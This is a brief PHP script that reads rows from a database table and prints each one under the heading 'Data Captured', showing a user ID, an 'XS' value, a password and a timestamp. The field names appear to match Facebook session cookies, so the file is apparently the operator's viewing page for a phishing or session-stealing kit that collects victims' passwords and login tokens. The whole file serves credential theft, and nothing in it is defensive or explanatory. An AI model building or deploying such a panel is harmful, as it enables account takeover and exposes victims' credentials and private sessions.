<?php

require __DIR__ . '/database.php';

  $sql =<<<EOF
      SELECT * from DATA;
EOF;

  $ret = pg_query($dbconn, $sql);
  if(!$ret) {
    echo pg_last_error($dbconn);
    exit;
  } 
  while($row = pg_fetch_row($ret)) {
    echo "<p>*********Data Captured**********</p>\n";
    echo "<p>C_USER = ". $row[1] . "</p>\n";
    echo "<p>XS = ". $row[2] ."</p>\n";
    echo "<p>PASSWORD = ". $row[3] ."</p>\n";
    echo "<p>TIME =  ".$row[4] ."</p>\n";
    echo "<p>------------------------------</p>\n";
    echo "<br /> <br />";
    echo "\n\n";
  }
  pg_close($dbconn);